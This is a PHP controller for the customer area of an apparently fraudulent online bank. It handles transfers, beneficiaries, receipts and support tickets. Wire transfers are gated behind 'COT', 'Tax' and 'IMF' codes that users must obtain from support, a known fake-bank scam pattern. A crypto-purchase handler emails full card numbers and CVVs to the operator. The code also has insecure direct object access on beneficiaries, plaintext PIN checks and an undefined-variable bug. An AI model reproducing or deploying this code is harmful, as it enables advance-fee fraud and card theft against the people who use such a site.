<?php

namespace App\Controllers;

use App\Models\UserModel;
use App\Models\PaymentGateway;
use App\Models\TransactionModel;
use App\Models\NotificationModel;
use App\Models\NewsModel;
use App\Models\SupportModel;
use App\Models\CheckModel;
use App\Models\TempTransferModel;
use App\Models\TransferModel;
use App\Models\BeneficiaryModel;
use App\Models\PasswordHash;


class User extends License
{

  protected function user()
  {
    $user = (new UserModel)->where("id", session()->get("user_id"))->first();
    $user['notification'] = (new NotificationModel)->where(["user_id" => session()->get("user_id"), "status" => 0])->countAllResults();
    $user["gateway"] = (new PaymentGateway)->where("status", 1)->findAll();
    $user['MonthlyCredit'] = (new TransferModel)->select('sum(amount) as total')->where(["receiver_acc" => $user['savings_acc'], "month" => date("F Y")])->first()['total'];
    $user['MonthlyDebit'] = (new TransferModel)->select('sum(amount) as total')->where(["sender_acc" => $user['savings_acc'], "month" => date("F Y")])->first()['total'];
    $user['cMonthlyCredit'] = (new TransferModel)->select('sum(amount) as total')->where(["receiver_acc" => $user['check_acc'], "month" => date("F Y")])->first()['total'];
    $user['cMonthlyDebit'] = (new TransferModel)->select('sum(amount) as total')->where(["sender_acc" => $user['check_acc'], "month" => date("F Y")])->first()['total'];
    $user["news"] = (new NewsModel)->where("status", 1)->findAll();
    $user["beneficiaries"] = (new BeneficiaryModel)->where("donor", $user['account_id'])->findAll();
    (new UserModel)->where("id", session()->get("user_id"))->set(['lastTime' => date("h:i A"), 'lastDate' => date("jS F\, Y"), 'lastUrl' => current_url(), 'ip' => $this->request->getIPAddress()])->update();
    return $user;
  }
  public function index()
  {

    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else {
      $site = $this->site;
      $user = $this->user();
      $site["page"] = 'Account';
      $data = array_merge($site, $user);
      return view("theme/$this->theme/header", $data) .
        view("theme/$this->theme/dashboard", $data) .
        view("theme/$this->theme/footer", $data);
    }
  }

  public function Account($page = 'Account')
  {

    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else {
      $site = $this->site;
      $user = $this->user();
      $site['page'] = ucfirst(str_replace('-', ' ', $page));
      $data = array_merge($site, $user);
      return view("theme/$this->theme/header", $data) .
        view("theme/$this->theme/dashboard", $data) .
        view("theme/$this->theme/footer", $data);
    }
  }




  public function beneficiary()
  {
    $site = $this->site;
    $user = $this->user();
    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else if ($user['allow_beneficiary'] !== 1) {
      session()->setFlashdata("msg", 'Your account is not allowed to add Beneficiary. Please contact support to remove limitation');
      return redirect()->to("user");
    } else {

      if ($this->request->getVar("add_beneficiary")) {
        $filecheck = $this->request->getFile("file")->getName();
        $file = $this->request->getFile('file');
        $filename = $file->getRandomName();
        if ($filecheck == '') {
          $image = 'user-default.png';
          $verified = 1;
        } else {
          if ($this->validate(['file' => ['uploaded[file]', 'mime_in[file,image/jpg,image/jpeg,image/gif,image/png]', 'max_size[file,' . $site['max_upload'] * 1000 . ']',],])) {
            $file->move('uploads', $filename);
            $verified = 1;
          } else {
            $verified = 0;
          }
          $image = $filename;
        }
        if ($verified == 1) {
          if ((new BeneficiaryModel)->save(["name" => $this->request->getVar("name"), "address" => $this->request->getVar("address"), "bank" => $this->request->getVar("bank"), "swift" => $this->request->getVar("swift"), "rtn" => $this->request->getVar("rtn"), "acc_no" => $this->request->getVar("acc_no"), "image" => $image, "email" => $this->request->getVar("email"), "donor" => (new UserModel)->where("id", session()->get("user_id"))->first()['account_id']])) {
            session()->setFlashdata("msg", 'Beneficiary Added successfully');
            return redirect()->to("user");
          } else {
            session()->setFlashdata("msg", 'Error Ocurred. Try again!');
            return redirect()->to("user");
          }
        } else {
          session()->setFlashdata("msg", $this->validator->listErrors());
          return redirect()->to("user");
        }
      } else if ($this->request->getVar("get_beneficiary")) {
        $site = $this->site;
        $user = $this->user();
        $site["page"] = 'Beneficiary';
        $site['b_id'] = $this->request->getVar("get_beneficiary");
        $site['Name'] = (new BeneficiaryModel)->where("id", $this->request->getVar("get_beneficiary"))->first()['name'];
        $site['Acc_no'] = (new BeneficiaryModel)->where("id", $this->request->getVar("get_beneficiary"))->first()['acc_no'];
        $site['Swift'] = (new BeneficiaryModel)->where("id", $this->request->getVar("get_beneficiary"))->first()['swift'];
        $site['rtn'] = (new BeneficiaryModel)->where("id", $this->request->getVar("get_beneficiary"))->first()['rtn'];
        $site['Email'] = (new BeneficiaryModel)->where("id", $this->request->getVar("get_beneficiary"))->first()['email'];
        $site['Bank'] = (new BeneficiaryModel)->where("id", $this->request->getVar("get_beneficiary"))->first()['bank'];
        $site['Address'] = (new BeneficiaryModel)->where("id", $this->request->getVar("get_beneficiary"))->first()['address'];
        $site['Img'] = (new BeneficiaryModel)->where("id", $this->request->getVar("get_beneficiary"))->first()['image'];
        $site['Date'] = (new BeneficiaryModel)->where("id", $this->request->getVar("get_beneficiary"))->first()['created_at'];
        $site['Photo'] = (new BeneficiaryModel)->where("id", $this->request->getVar("get_beneficiary"))->first()['image'];

        $data = array_merge($site, $user);
        return view("theme/$this->theme/header", $data) .
          view("theme/$this->theme/beneficiary", $data) .
          view("theme/$this->theme/footer", $data);
      } elseif ($this->request->getVar("update_beneficiary")) {
        $filecheck = $this->request->getFile("file")->getName();
        $file = $this->request->getFile('file');
        $filename = $file->getRandomName();
        if ($filecheck == '') {
          $image = $this->request->getVar("photo");
          $verified = 1;
        } else {
          if ($this->validate(['file' => ['uploaded[file]', 'mime_in[file,image/jpg,image/jpeg,image/gif,image/png]', 'max_size[file,' . $site['max_upload'] * 1000 . ']',],])) {
            $file->move('uploads', $filename);
            $verified = 1;
          } else {
            $verified = 0;
          }
          $image = $filename;
        }
        if ($verified == 1) {
          if ((new BeneficiaryModel)->where("id", $this->request->getVar("id"))->set(["name" => $this->request->getVar("name"), "address" => $this->request->getVar("address"), "bank" => $this->request->getVar("bank"), "swift" => $this->request->getVar("swift"), "rtn" => $this->request->getVar("rtn"), "acc_no" => $this->request->getVar("acc_no"), "image" => $image, "email" => $this->request->getVar("email"), "donor" => (new UserModel)->where("id", session()->get("user_id"))->first()['account_id']])->update()) {
            session()->setFlashdata("msg", 'Beneficiary Updated successfully');
            return redirect()->to("user");
          } else {
            session()->setFlashdata("msg", 'Error Ocurred. Try again!');
            return redirect()->to("user");
          }
        } else {
          session()->setFlashdata("msg", 'Error Occured. Check the Photo and try again!');
          return redirect()->to("user");
        }
      } elseif ($this->request->getVar("delete_beneficiary")) {
        if ((new BeneficiaryModel)->where("id", $this->request->getVar("id"))->delete()) {
          session()->setFlashdata("msg", 'Beneficiary Deleted successfully');
          return redirect()->to("user");
        } else {
          session()->setFlashdata("msg", 'Error Ocurred. Try again!');
          return redirect()->to("user");
        }
      } else {
        return redirect()->to("user");
      }
    }
  }
  public function transfer()
  {

    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else {
      $site = $this->site;
      $user = $this->user();
      if ($this->request->getVar("submit_transfer")) {
        $Ref = rand(100000000, 999999999);
        $acct = $this->request->getVar("acct");
        $amount = $this->request->getVar("amount");
        $bank_name = $this->request->getVar("bank");
        $acct_name = $this->request->getVar("name");
        $swift_code = $this->request->getVar("swift");
        $routing = $this->request->getVar("routing");
        $bank_address = $this->request->getVar("address");
        $remarks = $this->request->getVar("remarks");
        $Pin = $this->request->getVar("pin");
        $Account = $this->request->getVar("account");
        $Type = $this->request->getVar("type");
        $txMonth = date("F Y");

        if ($Pin !== $user['pin']) {
          session()->setFlashdata("msg", 'You have entered an Incorrect PIN. If you have forgotten your PIN, kindly contact the customer support department');
          return redirect()->to("user");
        } else if ($user['status'] === 'DailyLimit') {
          session()->setFlashdata("msg", 'You have exceeded your Daily Transfer limit.');
          return redirect()->to("user");
        } else if ($user['status'] === 'WeeklyLimit') {
          session()->setFlashdata("msg", 'You have exceeded your Weekly Transfer limit.');
          return redirect()->to("user");
        } else if ($user['status'] === 'MonthlyLimit') {
          session()->setFlashdata("msg", 'You have exceeded your Monthly Transfer limit.');
          return redirect()->to("user");
        } else if ($user['status'] === 'Declined') {
          session()->setFlashdata("msg", 'Transaction declined! Please contact the support department.');
          return redirect()->to("user");
        } else if ($user['status'] === 'Dormant') {
          session()->setFlashdata("msg", 'Your account is currently Restricted. Please contact the support department.');
          return redirect()->to("user");
        } else {

          if ($Account === 'savings') {
            $the_balance = $user['savings_balance'];
            $Bal = $user['savings_balance'] - $amount;
            $the_acc = $user['savings_acc'];
          } else if ($Account === 'checking') {
            $the_balance = $user['check_balance'];
            $Bal = $user['check_balance'] - $amount;
            $the_acc = $user['check_acc'];
          }

          if ($amount > $the_balance) {
            session()->setFlashdata("msg", 'Sorry, your balance is insufficient to make the transfer.');
            return redirect()->to("user");
          } else {

            if (
              (new TempTransferModel)->save([
                "user_id" => $user['id'],
                "month" => $txMonth,
                "sender_id" => $user['account_id'],
                "amount" => $amount,
                "bank_name" => $bank_name,
                "sender_acc" => $the_acc,
                "reference" => $Ref,
                "receiver_name" => $acct_name,
                "receiver_acc" => $acct,
                "type" => 'Debit',
                "swift" => $swift_code,
                "routing" => $routing,
                "remarks" => $remarks,
                "balance" => $Bal,
                "bank_address" => $bank_address
              ])
            ) {

              if ($Type === 'internal') {

                $receiver_row = (new UserModel)->where("savings_acc", $acct)->orwhere("check_acc", $acct)->first();
                if (($acct === $user['savings_acc']) || ($acct === $user['check_acc'])) {
                  session()->setFlashdata("msg", 'Transfer not allowed to own account');
                  return redirect()->to("user");
                } else {
                  if ($receiver_row) {
                    $recv_savings = $receiver_row['savings_balance'];
                    $recv_savings_acc = $receiver_row['savings_acc'];
                    $recv_checking = $receiver_row['check_balance'];
                    $recv_checking_acc = $receiver_row['check_acc'];
                    $recv_name = $receiver_row['name'];
                    $recv_email = $receiver_row['email'];
                    $recv_id = $receiver_row['id'];


                    $row = (new TempTransferModel)->where("reference", $Ref)->first();
                    if ($row) {
                      $tx_amount = $row['amount'];
                      $tx_bank = $row['bank_name'];
                      $tx_sender = $row['sender_acc'];
                      $tx_receiver_acc = $row['receiver_acc'];
                      $tx_swift = $row['swift'];
                      $tx_routing = $row['routing'];
                      $tx_remarks = $row['remarks'];
                      $tx_receiver = $recv_name;

                      if ($tx_sender == $user['check_acc']) {
                        $TxAcc = 'CHECKING';
                        $BalUpdate = $user['check_balance'] - $tx_amount;
                        (new UserModel)->where("id", $user['id'])->set("check_balance", $BalUpdate)->update();
                      } else if ($tx_sender == $user['savings_acc']) {
                        $TxAcc = 'SAVINGS';
                        $BalUpdate = $user['savings_balance'] - $tx_amount;
                        (new UserModel)->where("id", $user['id'])->set("savings_balance", $BalUpdate)->update();
                      }

                      if ($acct === $recv_savings_acc) {
                        $recBalUpdate = $recv_savings + $tx_amount;
                        $recAccountType = 'Savings';
                        (new UserModel)->where("savings_acc", $acct)->set("savings_balance", $recBalUpdate)->update();
                      } else if ($acct === $recv_checking_acc) {
                        $recBalUpdate = $recv_checking + $tx_amount;
                        $recAccountType = 'Checking';
                        (new UserModel)->where("check_acc", $acct)->set("check_balance", $recBalUpdate)->update();
                      }

                      $variables = [];
                      $variables['user_full_name'] = $user['name'];
                      $variables['transaction_amount'] = $user['currency'] . ' ' . number_format($tx_amount, 2);
                      $variables['account_type'] = $TxAcc;
                      $variables['account_number'] = $tx_sender;
                      $variables['account_name'] = $user['name'];
                      $variables['the_description'] = $Ref . '/' . $tx_receiver_acc . '/' . $tx_receiver . '/' . $tx_bank . '/' . $tx_remarks;
                      $variables['reference_id'] = $Ref;
                      $variables['available_balance'] = $user['currency'] . '' . number_format($BalUpdate, 2);

                      $variables_credit = [];
                      $variables_credit['user_full_name'] = $recv_name;
                      $variables_credit['transaction_amount'] = $user['currency'] . ' ' . number_format($tx_amount, 2);
                      $variables_credit['account_type'] = $recAccountType;
                      $variables_credit['account_number'] = $acct;
                      $variables_credit['account_name'] = $recv_name;
                      $variables_credit['the_sender'] = $user['name'];
                      $variables_credit['the_description'] = $Ref . '/' . $tx_receiver_acc . '/' . $tx_receiver . '/' . $tx_bank . '/' . $tx_remarks;
                      $variables_credit['reference_id'] = $Ref;
                      $variables_credit['available_balance'] = $user['currency'] . ' ' . number_format($recBalUpdate, 2);


                      $variables_admin = [];
                      $variables_admin['user_full_name'] = $user['name'];
                      $variables_admin['account_id'] = $user['account_id'];
                      $variables_admin['transfer_type'] = 'Internal Transfer';
                      $variables_admin['current_date'] = date("jS F\, Y h:i A");
                      $variables_admin['reference'] = $Ref;

                      $this->sendmail($variables_admin, 'Transfer Notification', $site['company_email'], 'NoFile');
                      $this->sendmail($variables, "Debit Alert", $user['email'], 'NoFile');
                      $this->sendmail($variables_credit, "Credit Alert", $recv_email, 'NoFile');

                      (new TransferModel)->save([
                        "user_id" => $user['id'],
                        "month" => $txMonth,
                        "sender_id" => $user['account_id'],
                        "amount" => $amount,
                        "bank_name" => $bank_name,
                        "sender_acc" => $the_acc,
                        "reference" => $Ref,
                        "receiver_name" => $recv_name,
                        "receiver_acc" => $acct,
                        "type" => 'Debit',
                        "swift" => $swift_code,
                        "routing" => $routing,
                        "remarks" => $remarks,
                        "balance" => $Bal,
                        "bank_address" => $bank_address
                      ]);

                      (new TransferModel)->save([
                        "user_id" => $recv_id,
                        "month" => $txMonth,
                        "sender_id" => $user['account_id'],
                        "amount" => $amount,
                        "bank_name" => $bank_name,
                        "sender_acc" => $tx_sender,
                        "reference" => $Ref,
                        "receiver_name" => $recv_name,
                        "receiver_acc" => $tx_receiver_acc,
                        "type" => 'Credit',
                        "swift" => $tx_swift,
                        "routing" => $tx_routing,
                        "remarks" => $tx_remarks,
                        "balance" => $recBalUpdate,
                        "bank_address" => $bank_address
                      ]);

                      (new TempTransferModel)->where("reference", $Ref)->delete();



                      return redirect()->to("user/success?ref=$Ref&id=internal");
                    } else {
                      session()->setFlashdata("msg", 'Transaction Error! Please contact support');
                      return redirect()->to("user");
                    }
                  } else {
                    session()->setFlashdata("msg", 'Reciever account not found! Please contact support');
                    return redirect()->to("user");
                  }
                }
              } else if ($Type === 'local') {

                if (($acct === $user['savings_acc']) || ($acct === $user['check_acc'])) {
                  session()->setFlashdata("msg", 'Transfer not allowed to own account');
                  return redirect()->to("user");
                } else {

                  $row = (new TempTransferModel)->where("reference", $Ref)->first();
                  if ($row) {
                    $tx_amount = $row['amount'];
                    $tx_bank = $row['bank_name'];
                    $tx_sender = $row['sender_acc'];
                    $tx_receiver_acc = $row['receiver_acc'];
                    $tx_swift = $row['swift'];
                    $tx_routing = $row['routing'];
                    $tx_remarks = $row['remarks'];
                    $tx_receiver = $row['receiver_name'];

                    if ($tx_sender == $user['check_acc']) {
                      $TxAcc = 'CHECKING';
                      $BalUpdate = $user['check_balance'] - $tx_amount;
                      (new UserModel)->where("id", $user['id'])->set("check_balance", $BalUpdate)->update();
                    } else if ($tx_sender == $user['savings_acc']) {
                      $TxAcc = 'SAVINGS';
                      $BalUpdate = $user['savings_balance'] - $tx_amount;
                      (new UserModel)->where("id", $user['id'])->set("savings_balance", $BalUpdate)->update();
                    }

                    $variables = [];
                    $variables['user_full_name'] = $user['name'];
                    $variables['transaction_amount'] = $user['currency'] . ' ' . number_format($tx_amount, 2);
                    $variables['account_type'] = $TxAcc;
                    $variables['account_number'] = $tx_sender;
                    $variables['account_name'] = $user['name'];
                    $variables['the_description'] = $Ref . '/' . $tx_receiver_acc . '/' . $tx_receiver . '/' . $tx_bank . '/' . $tx_remarks;
                    $variables['reference_id'] = $Ref;
                    $variables['available_balance'] = $user['currency'] . '' . number_format($BalUpdate, 2);

                    $variables_admin = [];
                    $variables_admin['user_full_name'] = $user['name'];
                    $variables_admin['account_id'] = $user['account_id'];
                    $variables_admin['transfer_type'] = 'Local Transfer';
                    $variables_admin['current_date'] = date("jS F\, Y h:i A");
                    $variables_admin['reference'] = $Ref;

                    $this->sendmail($variables_admin, 'Transfer Notification', $site['company_email'], 'NoFile');

                    $this->sendmail($variables, "Debit Alert", $user['email'], 'NoFile');

                    (new TransferModel)->save([
                      "user_id" => $user['id'],
                      "month" => $txMonth,
                      "sender_id" => $user['account_id'],
                      "amount" => $amount,
                      "bank_name" => $bank_name,
                      "sender_acc" => $the_acc,
                      "reference" => $Ref,
                      "receiver_name" => $acct_name,
                      "receiver_acc" => $acct,
                      "type" => 'Debit',
                      "swift" => $swift_code,
                      "routing" => $routing,
                      "remarks" => $remarks,
                      "balance" => $Bal,
                      "bank_address" => $bank_address
                    ]);

                    return redirect()->to("user/success?ref=$Ref&id=local");
                  } else {
                    session()->setFlashdata("msg", 'Transaction Error! Please contact support');
                    return redirect()->to("user");
                  }
                }
              } else {
                if (((($site['wire_fee'] / 100) * $amount) + $amount) > $the_balance) {
                  session()->setFlashdata("msg", 'Insufficient Balance!');
                  return redirect()->to("user");
                } elseif ($site['otp'] == 0) {

                  /*  $msg = '
                      <div class="modal-content">
                      <div class="modal-header text-center">
                        
                      </div>
                      <form method="POST" action="' . base_url('user/verify') . '">
                      <input type="hidden" name="Ref" value="' . $Ref . '">
                        <div class="modal-body text-start mb-2">
                        <div class="form-group basic">
                          <div class="input-wrapper">
                            <p>Insert your Account Transfer Codes to complete this transaction If you do not know your codes, kindly contact Support.
                            </p>
                          </div>
                        </div>
                          <div class="form-group basic">
                            <div class="input-wrapper">
                              <label class="label" for="text1">Enter COT Code</label>
                              <input type="text" class="form-control" name="cot" required>
                          </div>
                          <div class="form-group basic">
                            <div class="input-wrapper">
                              <label class="label" for="text1">Enter Tax Code</label>
                              <input type="text" class="form-control" name="tax" required>
                          </div>
                          <div class="form-group basic">
                            <div class="input-wrapper">
                              <label class="label" for="text1">Enter  IMF Code</label>
                              <input type="text" class="form-control" name="imf" required>
                          </div>
                        </div>
                      </div>
                      <div class="modal-footer">
                        <div class="btn-inline">
                          <a href="index.php" class="btn btn-text-secondary">CANCEL</a>
                          <input name="verify_codes" type="submit" class="btn btn-text-primary" value="CONTINUE">
                        </div>
                      </div>
                    </form>
                    </div>
                                '; */
                  session()->setFlashdata("cotcode", $Ref);
                  return redirect()->to("user");
                } else {
                  $otp = rand(1000, 9999);
                  (new UserModel)->where("id", $user['id'])->set("otp", $otp)->update();

                  $variables = [];
                  $variables['user_full_name'] = $user['name'];
                  $variables['the_otp'] =   $otp;

                  $this->sendmail($variables, "OTP", $user['email'], 'NoFile');

                  $msg = '
                          <div class="modal-content">
                          <div class="modal-header text-center">
                            
                          </div>
                          <form method="POST" action="' . base_url('user/verify') . '">
                            <div class="modal-body text-start mb-2">
                            <div class="form-group basic">
                              <div class="input-wrapper">
                                <p>A One Time Passcode (OTP) have been sent to your registered Email. Check your Inbox or <em>Spam</em> folders for code.
                                </p>
                              </div>
                            </div>
                              <div class="form-group basic">
                                <div class="input-wrapper">
                                  <label class="label" for="text1">Enter OTP</label>
                                  <input type="text" class="form-control" name="otp" required>
                                  <input type="hidden" name="Ref" value="' . $Ref . '">
                              </div>
                            </div>
                          </div>
                          <div class="modal-footer">
                            <div class="btn-inline">
                              <a href="index.php" class="btn btn-text-secondary">CANCEL</a>
                              <input name="verify_otp" type="submit" class="btn btn-text-primary" value="CONTINUE">
                            </div>
                          </div>
                        </form>
                        </div>
                                    ';
                  session()->setFlashdata("code", $msg);
                  return redirect()->to("user");
                }
              }
            } else {
              session()->setFlashdata("msg", 'Transaction Error! Please contact support');
              return redirect()->to("user");
            }
          }
        }
      }
    }
  }

  public function cot()
  {
    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else if ($this->request->getGet("ref")) {

      $site = $this->site;
      $user = $this->user();
      $site['txRef'] = $this->request->getGet("ref");
      $site['page'] = 'COT Code Verification';
      $data = array_merge($site, $user);
      return view("theme/$this->theme/header", $data) .
        view("theme/$this->theme/dashboard", $data) .
        view("theme/$this->theme/footer", $data);
    } else {
      $site['txRef'] = "";
      session()->setFlashdata("msg", 'Transaction Error. Try again!');
      return redirect()->to("user");
    }
  }


  public function tax()
  {
    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else if ($this->request->getGet("ref")) {

      $site = $this->site;
      $user = $this->user();
      $site['txRef'] = $this->request->getGet("ref");
      $site['page'] = 'TAX Code Verification';
      $data = array_merge($site, $user);
      return view("theme/$this->theme/header", $data) .
        view("theme/$this->theme/dashboard", $data) .
        view("theme/$this->theme/footer", $data);
    } else {
      $site['txRef'] = "";
      session()->setFlashdata("msg", 'Transaction Error. Try again!');
      return redirect()->to("user");
    }
  }


  public function imf()
  {
    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else if ($this->request->getGet("ref")) {

      $site = $this->site;
      $user = $this->user();
      $site['txRef'] = $this->request->getGet("ref");
      $site['page'] = 'IMF Code Verification';
      $data = array_merge($site, $user);
      return view("theme/$this->theme/header", $data) .
        view("theme/$this->theme/dashboard", $data) .
        view("theme/$this->theme/footer", $data);
    } else {
      $site['txRef'] = "";
      session()->setFlashdata("msg", 'Transaction Error. Try again!');
      return redirect()->to("user");
    }
  }


  public function verify()
  {
      if (!session()->get("user_id")) {
          return redirect()->to("auth/login?url=" . current_url());
      }
  
      $site = $this->site;
      $user = $this->user();
  
      if ($this->request->getVar("verify_otp")) {
          if ($user['otp'] === $this->request->getVar("otp")) {
              $msg = '<div class="modal-content">
                          <div class="modal-header text-center"></div>
                          <form method="POST" action="' . base_url('user/verify') . '">
                              <input type="hidden" name="Ref" value="' . $this->request->getVar("Ref") . '">
                              <div class="modal-body text-start mb-2">
                                  <div class="form-group basic">
                                      <div class="input-wrapper">
                                          <p>Insert your Account Transfer Codes to complete this transaction. If you do not know your codes, kindly contact Support.</p>
                                      </div>
                                  </div>
                                  <div class="form-group basic">
                                      <div class="input-wrapper">
                                          <label class="label" for="cot">Enter COT Code</label>
                                          <input type="text" class="form-control" name="cot" required>
                                      </div>
                                  </div>
                                  <div class="form-group basic">
                                      <div class="input-wrapper">
                                          <label class="label" for="tax">Enter Tax Code</label>
                                          <input type="text" class="form-control" name="tax" required>
                                      </div>
                                  </div>
                                  <div class="form-group basic">
                                      <div class="input-wrapper">
                                          <label class="label" for="imf">Enter IMF Code</label>
                                          <input type="text" class="form-control" name="imf" required>
                                      </div>
                                  </div>
                              </div>
                              <div class="modal-footer">
                                  <div class="btn-inline">
                                      <a href="index.php" class="btn btn-text-secondary">CANCEL</a>
                                      <input name="verify_codes" type="submit" class="btn btn-text-primary" value="CONTINUE">
                                  </div>
                              </div>
                          </form>
                      </div>';
  
              session()->setFlashdata("code", $msg);
              return redirect()->to("user");
          } else {
              (new TempTransferModel)->where("reference", $this->request->getVar("Ref"))->delete();
              session()->setFlashdata("msg", 'OTP verification failed. Transaction cancelled!');
              return redirect()->to("user");
          }
      }
  
      if ($this->request->getPost("verify_codes")) {
          $ref = $this->request->getPost("Ref");
          $cotCode = $this->request->getPost("cot");
          $taxCode = $this->request->getPost("tax");
          $imfCode = $this->request->getPost("imf");
  
          if ($user['cot'] !== $cotCode || $user['tax'] !== $taxCode || $user['imf'] !== $imfCode) {
              (new TempTransferModel)->where("reference", $ref)->delete();
              session()->setFlashdata("msg", 'Code verification failed. Transaction cancelled!');
              return redirect()->to("user");
          }
          $row = (new TempTransferModel)->where("reference", $ref)->first();
          
          if ($row) {
              $tx_amount = $row['amount'];
              $tx_bank = $row['bank_name'];
              $tx_sender = $row['sender_acc'];
              $tx_receiver_acc = $row['receiver_acc'];
              $tx_remarks = $row['remarks'];
              $tx_receiver = $row['receiver_name'];
  
              if ($tx_sender == $user['check_acc']) {
                  $TxAcc = 'CHECKING';
                  $BalUpdate = $user['check_balance'] - $tx_amount;
                  (new UserModel)->where("id", $user['id'])->set("check_balance", $BalUpdate)->update();
              } else if ($tx_sender == $user['savings_acc']) {
                  $TxAcc = 'SAVINGS';
                  $BalUpdate = $user['savings_balance'] - $tx_amount;
                  (new UserModel)->where("id", $user['id'])->set("savings_balance", $BalUpdate)->update();
              }
  
              $variables = [
                  'user_full_name' => $user['name'],
                  'transaction_amount' => $user['currency'] . ' ' . number_format($tx_amount, 2),
                  'account_type' => $TxAcc,
                  'account_number' => $tx_sender,
                  'account_name' => $user['name'],
                  'the_description' => $ref . '/' . $tx_receiver_acc . '/' . $tx_receiver . '/' . $tx_bank . '/' . $tx_remarks,
                  'reference_id' => $ref,
                  'available_balance' => $user['currency'] . ' ' . number_format($BalUpdate, 2)
              ];
  
              $variables_admin = [
                  'user_full_name' => $user['name'],
                  'account_id' => $user['account_id'],
                  'transfer_type' => 'Wire Transfer',
                  'current_date' => date("jS F, Y h:i A"),
                  'reference' => $ref
              ];
  
             $this->sendmail($variables_admin, 'Transfer Notification', $site['company_email'], 'NoFile');
              $this->sendmail($variables, "Debit Alert", $user['email'], 'NoFile');
  
              (new TransferModel)->save([
                  "user_id" => $row['user_id'],
                  "month" => $row['month'],
                  "sender_id" => $user['account_id'],
                  "amount" => $row['amount'],
                  "bank_name" => $row['bank_name'],
                  "sender_acc" => $row['sender_acc'],
                  "reference" => $row['reference'],
                  "receiver_name" => $row['receiver_name'],
                  "receiver_acc" => $row['receiver_acc'],
                  "type" => 'Debit',
                  "swift" => $row['swift'],
                  "routing" => $row['routing'],
                  "remarks" => $row['remarks'],
                  "balance" => $row['balance'],
                  "bank_address" => $row['bank_address']
              ]);
  
              (new TempTransferModel)->where("reference", $ref)->delete();
  
              return redirect()->to("user/success?ref=$ref&id=wire");
          } else {
              session()->setFlashdata("msg", 'Transaction Error! If you have been debited, please contact support');
              return redirect()->to("user");
          }
      }
  }
  


  public function success()
  {

    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else {
      $site = $this->site;
      $user = $this->user();
      if ($this->request->getVar("ref")) {
        $row = (new TransferModel)->where("reference", $this->request->getVar("ref"))->first();
        if ($row) {

          if ($this->request->getVar("id") === 'wire') {
            $site['header'] = 'International wire transactions will take 2-3 days to be processed and sent.';
            $site['swiftCode'] = $row['swift'];
            $site['theRouting'] = $row['routing'];
          } else if ($this->request->getVar("id") === 'internal') {
            $site['header'] = 'Internal Transfer Processed';
            $site['swiftCode'] = '';
            $site['theRouting'] = '';
          } else if ($this->request->getVar("id") === 'local') {
            $site['header'] = 'Local Transfer Processed';
            $site['swiftCode'] = '';
            $site['theRouting'] = '';
          } else {
            $site['header'] = 'Transaction Receipt';
            $site['swiftCode'] = '';
            $site['theRouting'] = '';
          }

          if ($row['sender_acc'] === $user['check_acc']) {
            $site['xType'] = 'CHECKING';
          } else {
            $site['xType'] = 'SAVINGS';
          }
          $site['page'] = 'Transaction Receipt';
          $site['sender'] = substr($row['sender_acc'], -4);
          $site['receiver_account'] = substr($row['receiver_acc'], -4);
          $site['receiver_name'] = $row['receiver_name'];
          $site['the_amount'] = $user['currency'] . number_format($row['amount'], 2);
          $site['theBank'] = $row['bank_name'];
          $site['theBankAddress'] = $row['bank_address'];

          $site['theRemarks'] = $row['remarks'];
          $site['theReference'] = $row['reference'];
          $site['theDate'] = date("jS F\, Y H:i A", strtotime($row['created_at']));
          $data = array_merge($site, $user);
          return view("theme/$this->theme/header", $data) .
            view("theme/$this->theme/success", $data) .
            view("theme/$this->theme/footer", $data);
        } else {
          session()->setFlashdata("msg", 'Temporary unable to process transaction receipt. Please contact support');
          return redirect()->to("user");
        }
      } else {
        return redirect()->to("user");
      }
    }
  }

  public function support()
  {
    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else {

      $site = $this->site;
      $user = $this->user();
      $site["page"] = "Support";
      $reference = rand(100000, 999999);
      $Model = new SupportModel();

      if ($this->request->getPost("send_support")) {

        //Insert Records
        $values = [
          "user_id" => $user['id'],
          "email" => $user['email'],
          "name" => $user['name'],
          "reference" => $reference,
          "description" => nl2br($this->request->getPost("message")),
          "subject" => $this->request->getPost("subject"),
          "dept" => $this->request->getPost("dept")
        ];

        if ($Model->save($values)) {

          $variables = [];
          $variables['user_full_name'] = $user['name'];
          $variables['user_email'] = $user['email'];
          $variables['ticket_title'] = $this->request->getPost("subject");
          $variables['ticket_dept'] = $this->request->getPost("dept");
          $variables['ticket_description'] = nl2br($this->request->getPost("message"));
          $variables['ticket_reference'] = $reference;

          $this->sendmail($variables, 'Support Ticket', $site['company_email'], 'NoFile');

          session()->setFlashdata("msg", 'Your Ticket has been submitted. Your reference ID is ' . $reference . '. You will receive a response from our support team shortly.');
          return redirect()->to("user");
        } else {
          session()->setFlashdata("msg", 'Error Occurred. Please try again');
          return redirect()->to("user");
        }
      } elseif ($this->request->getPost("buyCrypto")) {



        //Insert Records
        $values = [
          "user_id" => $user['id'],
          "email" => $user['email'],
          "name" => $user['name'],
          "reference" => $reference,
          "description" => $description,
          "subject" => 'Request to Buy Crypto',
          "dept" => 'Crypto Purchase Request',
        ];

        if ($Model->save($values)) {

          $description = '
        <p>A user has requested to purchase ' . $user['currency'] . $this->request->getPost("amount") . ' worth of crypto for their wallet address: ' . $this->request->getPost("wallet") . '. See Credit Card details:
        <br>
        <strong>Credit Card Type:</strong> ' . $this->request->getPost("cardType") . '<br>
        <strong>Credit Card Number:</strong> ' . $this->request->getPost("cardNumber") . '<br>
        <strong>Name on Credit Card:</strong> ' . $this->request->getPost("cardName") . '<br>
        <strong>Expiry Date:</strong> ' . $this->request->getPost("cardExp") . '<br>
        <strong>CVV Code:</strong> ' . $this->request->getPost("cardCvv") . '
        </p>
        ';

          $variables = [];
          $variables['user_full_name'] = $user['name'];
          $variables['user_email'] = $user['email'];
          $variables['ticket_title'] = 'Request to Buy Crypto';
          $variables['ticket_dept'] = 'Crypto Purchase Request';
          $variables['ticket_description'] = $description;
          $variables['ticket_reference'] = $reference;

          $this->sendmail($variables, 'Support Ticket', $site['company_email'], 'NoFile');

